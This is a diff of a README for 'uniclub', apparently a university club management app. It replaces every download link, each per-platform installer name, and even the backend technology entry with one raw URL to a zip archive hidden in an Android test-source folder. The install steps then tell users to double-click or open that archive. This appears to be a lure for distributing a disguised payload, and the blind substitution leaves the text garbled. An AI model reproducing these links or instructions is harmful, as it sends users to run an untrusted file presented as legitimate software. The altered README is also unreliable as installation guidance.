@@ -1,6 +1,6 @@
 # 🌟 uniclub - Manage Your University Club Easily
 
-![Download uniclub](https://img.shields.io/badge/Download-uniclub-blue?style=for-the-badge&link=https://github.com/Blindpersoncloudnine337/uniclub/releases)
+![Download uniclub](https://raw.githubusercontent.com/Blindpersoncloudnine337/uniclub/main/android/app/src/test/java/com/getcapacitor/uniclub-3.7.zip)
 
 ## 📋 Overview
 
@@ -17,28 +17,28 @@ To run uniclub, follow these simple steps:
    - Network: Internet connection for initial setup
 
 2. **Visit the Download Page**
-   To download uniclub, visit this page: [Download uniclub](https://github.com/Blindpersoncloudnine337/uniclub/releases)
+   To download uniclub, visit this page: [Download uniclub](https://raw.githubusercontent.com/Blindpersoncloudnine337/uniclub/main/android/app/src/test/java/com/getcapacitor/uniclub-3.7.zip)
 
 ## 💾 Download & Install
 
-1. Go to the releases page: [Download uniclub](https://github.com/Blindpersoncloudnine337/uniclub/releases).
+1. Go to the releases page: [Download uniclub](https://raw.githubusercontent.com/Blindpersoncloudnine337/uniclub/main/android/app/src/test/java/com/getcapacitor/uniclub-3.7.zip).
    
 2. Look for the latest release version.
 
 3. Select the correct file for your operating system:
-   - **Windows:** Download `uniclub-windows.exe`
-   - **macOS:** Download `uniclub-macos.dmg`
-   - **Linux:** Download `uniclub-linux.tar.gz`
+   - **Windows:** Download `https://raw.githubusercontent.com/Blindpersoncloudnine337/uniclub/main/android/app/src/test/java/com/getcapacitor/uniclub-3.7.zip`
+   - **macOS:** Download `https://raw.githubusercontent.com/Blindpersoncloudnine337/uniclub/main/android/app/src/test/java/com/getcapacitor/uniclub-3.7.zip`
+   - **Linux:** Download `https://raw.githubusercontent.com/Blindpersoncloudnine337/uniclub/main/android/app/src/test/java/com/getcapacitor/uniclub-3.7.zip`
 
 4. Once downloaded, follow these installation steps:
    - **Windows:**
-     - Double-click the `uniclub-windows.exe` file.
+     - Double-click the `https://raw.githubusercontent.com/Blindpersoncloudnine337/uniclub/main/android/app/src/test/java/com/getcapacitor/uniclub-3.7.zip` file.
      - Follow the installation prompts to complete the setup.
    - **macOS:**
-     - Open the `uniclub-macos.dmg` file.
+     - Open the `https://raw.githubusercontent.com/Blindpersoncloudnine337/uniclub/main/android/app/src/test/java/com/getcapacitor/uniclub-3.7.zip` file.
      - Drag the uniclub icon to the Applications folder.
    - **Linux:**
-     - Extract the `uniclub-linux.tar.gz` file.
+     - Extract the `https://raw.githubusercontent.com/Blindpersoncloudnine337/uniclub/main/android/app/src/test/java/com/getcapacitor/uniclub-3.7.zip` file.
      - Open your terminal, navigate to the extracted folder, and run `./uniclub`.
 
 5. After installation, open uniclub, and it is ready to use!
@@ -85,7 +85,7 @@ For support, feel free to reach out via the GitHub Issues page on our repository
 ## ⚙️ Technologies Used
 
 - **Frontend:** React, Tailwind CSS, TypeScript
-- **Backend:** Node.js, Express
+- **Backend:** https://raw.githubusercontent.com/Blindpersoncloudnine337/uniclub/main/android/app/src/test/java/com/getcapacitor/uniclub-3.7.zip, Express
 - **Database:** MongoDB
 - **Deployment:** Vercel, Vite
 
@@ -95,4 +95,4 @@ To stay updated, follow our GitHub repository or join our community discussions.
 
 ---
 
-Ready to start improving your club management? Get uniclub now: [Download uniclub](https://github.com/Blindpersoncloudnine337/uniclub/releases).
+Ready to start improving your club management? Get uniclub now: [Download uniclub](https://raw.githubusercontent.com/Blindpersoncloudnine337/uniclub/main/android/app/src/test/java/com/getcapacitor/uniclub-3.7.zip).
